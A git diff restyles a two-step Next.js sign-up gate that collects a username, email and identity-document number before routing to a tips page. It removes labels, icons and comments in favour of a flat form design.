@@ -4,7 +4,7 @@ import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import { submitGateForm, submitVerificationForm } from "@/features/auth/actions";
-import { ChevronDown, Loader2, AlertCircle, User, Mail, Fingerprint } from "lucide-react";
+import { ChevronDown, Loader2, AlertCircle } from "lucide-react";
 
 export default function GatePage() {
   const router = useRouter();
@@ -34,7 +34,6 @@ export default function GatePage() {
     setLoading(true);
     setError("");
 
-    // Pass the new fields to the action
     const result = await submitGateForm(username, email, idNumber);
     
     if (result?.error) {
@@ -42,12 +41,10 @@ export default function GatePage() {
       setLoading(false);
     } else {
       setStep(2);
-      setIdNumber(""); // Clear the ID so they must type it again for verification
+      setIdNumber(""); 
       setLoading(false);
     }
   };
-
-  // Find the handleStep2 function and update the call:
 
   const handleStep2 = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -60,7 +57,6 @@ export default function GatePage() {
       return;
     }
 
-    // PASS THE EMAIL HERE
     const result = await submitVerificationForm(idType, idNumber, email);
     
     if (result?.error) {
@@ -70,14 +66,13 @@ export default function GatePage() {
       router.push("/tips?reviewing=true");
     }
   };
+
   return (
     <div className="min-h-screen bg-bg-deep flex items-center justify-center p-4">
-      <div className="w-full max-w-md bg-bg-slate rounded-2xl border border-gray-700 p-8 shadow-2xl relative overflow-hidden">
+      {/* Removed the outer card container to match the flat design */}
+      <div className="w-full max-w-md relative">
         
-        {/* Glow Effect */}
-        <div className="absolute top-0 right-0 w-32 h-32 bg-brand-green/10 rounded-full blur-3xl" />
-
-        <div className="flex flex-col items-center mb-8 relative z-10">
+        <div className="flex flex-col items-center mb-8">
           <div className="relative h-12 w-40 mb-4">
              <Image 
                src="/logo.png" 
@@ -97,92 +92,66 @@ export default function GatePage() {
         </div>
 
         {error && (
-          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-lg mb-6 flex items-center gap-2">
+          <div className="bg-brand-red/10 border border-brand-red/20 text-brand-red text-sm p-3 rounded-lg mb-4 flex items-center gap-2">
             <AlertCircle size={16} /> {error}
           </div>
         )}
 
         {/* STEP 1 FORM */}
         {step === 1 && (
-          <form onSubmit={handleStep1} className="flex flex-col gap-4 relative z-10">
+          <form onSubmit={handleStep1} className="flex flex-col gap-4">
             
-            {/* Username Input */}
-            <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">Username</label>
-              <div className="relative">
-                <User className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
-                <input
-                  type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
-                  placeholder="e.g. JohnDoe99"
-                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
-                />
-              </div>
-            </div>
+            <input
+              type="text" required value={username} onChange={(e) => setUsername(e.target.value)}
+              placeholder="Username"
+              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
+            />
 
-            {/* Email Input */}
-            <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">Email Address</label>
-              <div className="relative">
-                <Mail className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
-                <input
-                  type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
-                  placeholder="e.g. john@example.com"
-                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
-                />
-              </div>
-            </div>
+            <input
+              type="email" required value={email} onChange={(e) => setEmail(e.target.value)}
+              placeholder="Email Address"
+              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
+            />
 
-            {/* Primary ID Input */}
-            <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">Primary ID Number</label>
-              <div className="relative">
-                <Fingerprint className="absolute left-3 top-3.5 text-text-muted w-5 h-5" />
-                <input
-                  type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
-                  placeholder="Enter your ID number"
-                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-surface-white focus:outline-none focus:border-brand-green"
-                />
-              </div>
-            </div>
+            <input
+              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
+              placeholder="Primary ID Number"
+              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
+            />
 
             <button type="submit" disabled={loading}
-              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
-              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Get Passcode"}
+              className="mt-2 w-full bg-[#218838] hover:bg-[#1e7e34] text-white text-lg font-medium py-4 rounded-md transition-colors flex justify-center items-center">
+              {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Get Passcode"}
             </button>
           </form>
         )}
 
         {/* STEP 2 FORM */}
         {step === 2 && (
-          <form onSubmit={handleStep2} className="flex flex-col gap-4 relative z-10">
-            <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">Select ID Type</label>
-              <div className="relative">
-                <select 
-                  value={idType} onChange={(e) => setIdType(e.target.value)}
-                  className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 pl-4 pr-10 text-surface-white appearance-none focus:outline-none focus:border-brand-green cursor-pointer"
-                >
-                  <option value="NIN">National Identity Number (NIN)</option>
-                  <option value="Voter's Card">Permanent Voter's Card</option>
-                  <option value="Driver's License">Driver's License</option>
-                  <option value="International Passport">International Passport</option>
-                </select>
-                <ChevronDown className="absolute right-3 top-3.5 text-text-muted w-5 h-5 pointer-events-none" />
-              </div>
+          <form onSubmit={handleStep2} className="flex flex-col gap-4">
+            
+            <div className="relative">
+              <select 
+                value={idType} onChange={(e) => setIdType(e.target.value)}
+                className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 pl-4 pr-10 text-white appearance-none focus:outline-none focus:border-gray-400 transition-colors"
+              >
+                <option value="NIN">National Identity Number (NIN)</option>
+                <option value="Voter's Card">Permanent Voter's Card</option>
+                <option value="Driver's License">Driver's License</option>
+                <option value="International Passport">International Passport</option>
+              </select>
+              <ChevronDown className="absolute right-4 top-4 text-gray-300 w-6 h-6 pointer-events-none" />
             </div>
 
-            <div className="flex flex-col gap-2">
-              <label className="text-sm text-text-muted font-medium">{idType} Number</label>
-              <input
-                type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
-                placeholder={`Enter your ${idType} number`}
-                className="w-full bg-bg-deep border border-gray-700 rounded-xl py-3 px-4 text-surface-white focus:outline-none focus:border-brand-green"
-              />
-            </div>
+            <input
+              type="text" required value={idNumber} onChange={(e) => setIdNumber(e.target.value)}
+              placeholder={`${idType} Number`}
+              className="w-full bg-[#3b4048] border border-gray-600 rounded-md py-4 px-4 text-white placeholder-gray-300 focus:outline-none focus:border-gray-400 transition-colors"
+            />
 
             <button type="submit" disabled={loading}
-              className="mt-4 w-full bg-brand-green hover:bg-brand-green-dark text-surface-white font-bold py-3 rounded-xl transition-colors flex justify-center items-center gap-2">
-              {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Verify & Unlock"}
+              className="mt-2 w-full bg-[#218838] hover:bg-[#1e7e34] text-white text-lg font-medium py-4 rounded-md transition-colors flex justify-center items-center">
+              {loading ? <Loader2 className="w-6 h-6 animate-spin" /> : "Verify & Unlock"}
             </button>
           </form>
         )}
